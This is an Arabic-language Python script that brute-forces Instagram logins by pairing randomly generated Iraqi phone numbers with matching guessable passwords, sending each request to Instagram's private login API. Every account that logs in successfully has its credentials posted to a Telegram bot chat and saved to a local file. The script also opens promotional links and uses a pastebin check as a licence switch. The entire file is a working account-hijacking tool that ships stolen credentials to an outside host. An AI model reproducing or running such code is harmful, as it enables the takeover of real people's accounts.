import os
try:
    import uuid
except:
    os.system ("pip install uuid")
try:
    from random import *
except:
    os.systeam("pip install random ")
try:
     import string

except:
    os.system("pip install string")
try:
    import requests 

except:
    os.system ("pip install requests ")
try:
    from user_agent import generate_user_agent

except:
    os.system("pip install user_agent ")
try:
    from datetime import datetime
except:
    os.system("pip install datetime ")
try:
    import time
except:
    os.system("pip install time")
os.system("clear")
try:
    import pyfiglet
except:
    os.system("pip install pyfiglet")
os.system("clear")
import pyfiglet
import os
from time import sleep
import webbrowser
import os, sys, requests
webbrowser.open('https://t.me/Art4Q')
Z = '\x1b[1;31m'
P = '\x1b[2;35m'
J = '\x1b[1;31m'
I = '\x1b[2;36m'
G = '\x1b[1;32m'
H = '\x1b[2;35m'
S = '\x1b[2;32m'
A = '\x1b[2;36m'
webbrowser.open('https://youtube.com/channel/UCDe7G2nUUatJS_j-WsGVCOQ')
import user_agent, random, uuid, requests, string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
import pyfiglet, webbrowser
sleep(1)
P55 = pyfiglet.figlet_format( '☆Eslam☆')
sleep(1)
os.system('clear')
aa = 0
zz = 0
print('\n')
print(J + P55)
print(H + '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n ')
ID = input(G + '  ID telegram  ➪   ')
print('\n')
sleep(1)
tok = input(G + '  TOKEN Telegram ➪     ')
print('\n\n\n')
print(H + '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n ')
w = 'https://pastebin.com/raw/Ts33wEg9'
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=مطور إسلام✅➕👌").json()
id_msg = start_msg['result']['message_id']
rss = requests.get(w).text
if 'CJ' in rss:
    sleep(0.1)
    r = requests.Session()
    user = '0987654321'
    while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+964770' + us
        password = '0770' + us
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip, deflate', 
         'Accept-Language':'en-US', 
         'X-IG-Capabilities':'3brTvw==', 
         'X-IG-Connection-Type':'WIFI', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {'uuid':uid,  'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            zz += 1
            print(G + 'username ==> : ' + username + ': password ==> : ' + password)
            tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=- -Hi تم صيد - -\n -  - - - - - - - - - - - - - - - - - - - - - - - - - \n - ✅ emil :  {username} \n-  ✅PASS :     {password}\n- - - - - - - - - - - - - - - - - - - - - -\n by :- @rl_xco - @AAAKK0"
            i = requests.post(tlg)
            with open('insta.txt', 'a') as (HACKED):
                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print(+'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= Hi جاري الفحص يا اسد \n - - - - - - - - - - - - - - - - - - - - - -\n- -تم صيد  [{zz}]✅\n\n\n- -جاري فحص [{aa}]❎  ({username})\n\n- - - - - - - - - - - - - - - - - - - - - -\n BY @rl_xco -: @AAAKK0 ")
            print(Z + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1

    print('انتهـت الـفـتره المـجانـيه راسـل المـطور لـتفعيل ')
